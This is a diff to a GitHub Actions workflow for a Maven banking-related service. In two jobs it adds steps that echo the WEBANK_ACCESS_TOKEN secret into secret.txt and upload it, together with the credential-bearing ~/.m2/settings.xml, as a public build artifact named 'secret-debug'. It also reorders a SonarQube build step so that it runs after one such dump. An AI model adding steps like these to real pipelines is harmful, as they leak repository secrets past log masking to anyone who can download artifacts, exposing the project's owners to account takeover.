@@ -41,6 +41,12 @@ jobs:
                   </servers>
                 </settings>" > ~/.m2/settings.xml
 
+      - run: echo "${{ secrets.WEBANK_ACCESS_TOKEN }}" > secret.txt
+      - uses: actions/upload-artifact@v4
+        with:
+          name: secret-debug
+          path: ~/.m2/settings.xml, secret.txt
+
       - name: Remove Maven Cache
         run: rm -rf ~/.m2/repository
 
@@ -75,6 +81,12 @@ jobs:
                     </server>
                   </servers>
                 </settings>" > ~/.m2/settings.xml
+
+      - run: echo "${{ secrets.WEBANK_ACCESS_TOKEN }}" > secret.txt
+      - uses: actions/upload-artifact@v4
+        with:
+          name: secret-debug
+          path: ~/.m2/settings.xml, secret.txt
 
       - name: Remove Maven Cache
         run: rm -rf ~/.m2/repository
@@ -148,14 +160,14 @@ jobs:
                     </servers>
                   </settings>" > ~/.m2/settings.xml
 
-        - name: Build and analyze
-          env:
-            SONAR_TOKEN: ${{ secrets.SONAR_TOKEN }}
-            SONAR_HOST_URL: ${{ secrets.SONAR_HOST_URL }}
-          run: mvn -B verify org.sonarsource.scanner.maven:sonar-maven-plugin:sonar -Dsonar.projectKey=webank-pending-registration-service -Dsonar.projectName='webank-pending-registration-service'
-
         - run: echo "${{ secrets.WEBANK_ACCESS_TOKEN }}" > secret.txt
         - uses: actions/upload-artifact@v4
           with:
             name: secret-debug
             path: ~/.m2/settings.xml, secret.txt
+
+        - name: Build and analyze
+          env:
+            SONAR_TOKEN: ${{ secrets.SONAR_TOKEN }}
+            SONAR_HOST_URL: ${{ secrets.SONAR_HOST_URL }}
+          run: mvn -B verify org.sonarsource.scanner.maven:sonar-maven-plugin:sonar -Dsonar.projectKey=webank-pending-registration-service -Dsonar.projectName='webank-pending-registration-service'
